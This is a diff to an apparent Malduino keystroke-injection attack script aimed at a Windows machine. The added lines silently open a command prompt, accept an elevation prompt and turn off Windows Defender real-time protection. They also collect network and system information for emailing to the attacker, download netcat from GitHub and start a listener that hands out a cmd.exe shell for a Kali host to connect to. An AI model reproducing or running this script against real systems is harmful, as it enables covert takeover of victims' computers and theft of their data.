@@ -10,12 +10,17 @@ SENDTOACCOUNT: The email you want to send info.txt to
 https://www.youtube.com/watch?v=Op4s5e8gL0o
 
 ----Malduino Script 1---- Target computer is the host
-REM Capture IP + system info and send via email
-DELAY 2000
-GUI r
+REM Hide CMD
+DELAY 100
+CONTROL ESC
 DELAY 200
 STRING CMD
+DELAY 600
+RIGHT
+DOWN
 ENTER
+DELAY 400
+ALT y
 DELAY 600
 ALT SPACE
 DELAY 100
@@ -122,7 +127,18 @@ DOWNARROW
 DOWNARROW
 DOWNARROW
 ENTER
+REM Disable Windows Defender | https://www.itechtics.com/enable-disable-windows-defender/
 DELAY 400
+STRING powershell
+ENTER
+DELAY 600
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 600
+STRING exit
+ENTER
+REM Capture IP + system info and send via email
+DELAY 600
 STRING echo "##### ipconfig/all output below #####" > %userprofile%\info.txt
 ENTER
 DELAY 600
@@ -189,14 +205,51 @@ DELAY 1000
 STRING exit
 ENTER
 DELAY 600
-STRING del info.txt & exit
+STRING del info.txt
+ENTER
+DELAY 600
+REM Download Netcat from github and initiate reverse root... We are not using git clone because it is not native
+STRING powershell
+ENTER
+DELAY 600
+STRING $Url = "https://github.com/ReedGraff/Malduino/archive/refs/heads/main.zip"
+ENTER
+DELAY 100
+STRING cls
+ENTER
+DELAY 100
+STRING $Out = "NetCat.zip"
+ENTER
+DELAY 100
+STRING Invoke-RestMethod -Uri $Url -OutFile $Out
 ENTER
 DELAY 1000
-REM Download Netcat and initiate reverse root
-DOWNLOAD NETCAT
-enter folder/directroy with nc.exe
-nc -Lp YOURPORT -vv -e cmd.exe
-If firewall pops up, do something to pass it...
+STRING $loc = (Get-Location).path
+ENTER
+DELAY 100
+STRING Expand-Archive -Path NetCat.zip -DestinationPath $loc
+ENTER
+DELAY 600
+STRING del NetCat.zip
+ENTER
+DELAY 600
+STRING Move-Item -Path $loc\Malduino-main\assets\netcat -Destination $loc
+ENTER
+DELAY 100
+STRING del Malduino-main
+ENTER
+DELAY 100
+STRING A
+ENTER
+DELAY 100
+STRING cd netcat
+ENTER
+DELAY 100
+STRING cls
+ENTER
+DELAY 100
+STRING nc -Lp YOURPORT -vv -e cmd.exe
+ENTER
 
 ----Kali Linux----
 nc TARGETHOST YOURPORT
